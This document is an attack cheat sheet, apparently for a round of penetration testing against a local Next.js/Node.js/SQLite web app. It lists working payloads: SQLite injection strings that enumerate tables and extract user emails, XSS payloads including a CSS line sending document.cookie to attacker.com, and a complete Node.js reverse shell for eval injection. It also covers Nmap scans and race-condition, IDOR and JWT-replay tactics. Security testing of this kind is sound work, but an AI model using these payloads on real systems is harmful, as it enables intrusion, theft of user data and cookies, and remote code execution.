# Attack Cheat Sheet (Target: Next.js/Node.js/SQLite) - Round 11

## 1. Information Gathering (Nmap tailored)
Since we are localhost/web, traditional Nmap is less useful, but good for checking exposed dev ports.
```bash
# Check for other exposed services locally
nmap -p- -sV localhost
# Check specifically for exposed db helpers or debuggers
nmap -p 3000,9229,5555 localhost
```

## 2. API Enumeration (Fuzzing)
Targeting Next.js API Routes (`pages/api/*`).

### Endpoints
*   `/api/auth/login`
*   `/api/auth/register`
*   `/api/usage/record`
*   `/api/export-portfolio` (High Risk: PDF gen)
*   `/api/exercise-system` (High Risk: Sandbox)

### Wordlists
*   `common-api-endpoints.txt`
*   `raft-medium-directories.txt`

## 3. SQL Injection (SQLite Specific)
SQLite has distinct syntax.
```sql
-- Boolean Inference
' OR 1=1--
admin' OR 1=1--

-- SQLite version check
' UNION SELECT sqlite_version()--

-- Table enumeration (if UNION works)
' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--

-- Extract Usernames
' UNION SELECT group_concat(email) FROM users--
```

## 4. Cross-Site Scripting (React Context)
React escapes by default, so look for:
*   `dangerouslySetInnerHTML`
*   `href` attributes (Javascript Protocol)
*   Server-Side Rendering (SSR) hydration mismatches

**Payloads:**
```javascript
// Classic
<script>alert(1)</script>

// Protocol Bypass
javascript:alert(1)

// Image Error (works if sanitizer misses attributes)
<img src=x onerror=alert(1)>

// CSS Exfiltration (if styles are injectable)
body { background-image: url('http://attacker.com/leak?c=' + document.cookie); }
```

## 5. Node.js Specific RCE
If `eval()`, `setTimeout()`, or `vm` are used improperly.
```javascript
// Node Reverse Shell (if passed to eval)
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

## 6. Logic Flaws (Manual)
*   **Race Conditions**: Send 20 concurrent requests to `/api/usage/record` to inflate counters.
*   **IDOR**: Change `userId` in POST to `/api/export-portfolio`.
*   **JWT Replay**: Capture an old token and try to use it (Test Token Versioning).
